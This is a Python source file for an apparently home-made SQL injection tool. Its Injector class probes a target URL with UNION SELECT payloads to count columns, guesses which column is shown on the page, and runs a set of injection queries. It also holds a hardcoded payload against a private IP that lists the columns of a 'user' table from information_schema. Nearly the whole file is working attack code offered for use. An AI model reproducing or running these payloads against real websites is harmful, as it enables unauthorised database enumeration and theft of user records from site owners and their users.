#!/usr/bin/python
""" Used for basic union-based SQL injection.

"""
import os, sys
import builder, scanner
import re
from collections import Counter
    
class Injector:
    
    # Pass dict of options as param flags
    def __init__(self, flags):
        self.flags = flags 
        self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
        self.columns_upper_limit_guess = 9
        self.delimiter = '/**/' #Can also be '%20'
        self.scan = scanner.Scanner()
    
    # Diff two html lists by turning into sets and taking difference.
    # First param should be before injection, 2nd param after.
    # Returns list representing difference between the two pages.
    def html_diff(self, before_injection, after_injection):
        diff = list(set(after_injection) - set(before_injection))

        return diff
    
    # Try unions until no SQL errors returned.
    # Return number of columns in exposed table.
    # Can test using:
    #   i)  UNION SELECT [1],[1,2],...
    #   ii) ORDER BY [1],[2],...
    #
    def get_num_columns(self, page):
        count = 1
    
        original_page = self.scan.page(page)
        ### Using UNION SELECT appending 1,2,... ###
        union = page + '%20UNION%20SELECT%201'

        ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!

        while len(self.html_diff(original_page, self.scan.page(union))) == 0 or 'SELECT' in self.html_diff(original_page, self.scan.page(union)):
            count += 1
            union += ',%20' + str(count + self.offset)

        """
        ### Using ORDER BY x--, x = 9,8,... ###
        count = self.columns_upper_limit_guess
        order_by = page + self.delimiter + 'ORDER' + self.delimiter + 'BY' + self.delimiter + str(count) + '--'
        while 'Unknown' in self.html_diff(original_page, self.get_page(order_by)) and count > 0:
            count -= 1
            temp = list(order_by)
            temp[-3] = str(count)
            order_by = "".join(temp)
        """
    
        return count
    
    def get_visible_param(self, page):
        """ Get most common number appearing in HTML, this is where to inject variables.
            :page: List of HTML lines.
            :returns: Most commonly seen number in page, hopefully the injectable param.
        """
        
        # Make query string
        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, self.get_num_columns(page) + 1)]
        new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)

        diff = self.html_diff(self.scan.page(page), self.scan.page(new_url))
        nums = [filter(str.isdigit, str(re.sub('<.*>','', line))) for line in diff]
        #nums.remove('')

        return Counter(nums).most_common(1)[0][0]
        
    
    def injection(self, page, queries):
        """ Takes page to fuzz for injections and params to check for.
            :returns: dict of lists, keys are injected strings, values are results.
        """
        default_page = self.scan.page(page)
        data = {}


        for query in queries:
            data[query] = (self.html_diff(default_page, self.scan.page(queries[query])))

        #print queries['user table']
        print (self.html_diff(default_page, self.scan.page("http://192.168.83.134/?id=null%20%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20'user'")))

        return data
    
    #
